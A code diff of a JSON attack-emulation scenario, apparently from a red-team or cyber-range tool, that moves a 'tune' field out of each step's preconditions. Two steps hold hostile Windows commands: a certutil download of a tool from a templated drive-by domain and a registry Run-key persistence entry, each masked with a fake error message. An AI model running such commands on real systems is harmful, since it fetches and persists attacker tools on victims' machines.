@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -22,7 +23,8 @@
             "label": "actuator2",
             "preconditions": {
                 "tool": "self.tool_name2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -32,7 +34,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -42,7 +45,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "Interfaces3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -70,7 +76,8 @@
             "label": "DNS3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
                 "payload": "help_win_x86.exe",
                 "driveby": "self.driveby3",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -88,7 +96,8 @@
             "label": "Interfaces4",
             "preconditions": {
                 "driveby": "self.driveby4"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -96,7 +105,8 @@
             "label": "DNS4",
             "preconditions": {
                 "driveby": "self.driveby4"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -106,7 +116,8 @@
                 "payload": "dismcore.dll",
                 "driveby": "self.driveby4",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -114,7 +125,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -123,7 +135,8 @@
             "preconditions": {
                 "tool": "self.tool2",
                 "actuator": "self.actuator2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -134,7 +147,8 @@
                 "tool": "self.tool2",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -145,7 +159,8 @@
                 "tool": "self.tool2",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -156,10 +171,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool2",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -169,10 +184,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain3}/${self.tool_name3}${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \u0001 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain3}/${self.tool_name3}${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \u0001 Command not found\""
             }
         },
         {
@@ -182,10 +197,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \\1 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \\1 Command not found\""
             }
         },
         {
@@ -196,7 +211,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -206,7 +222,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
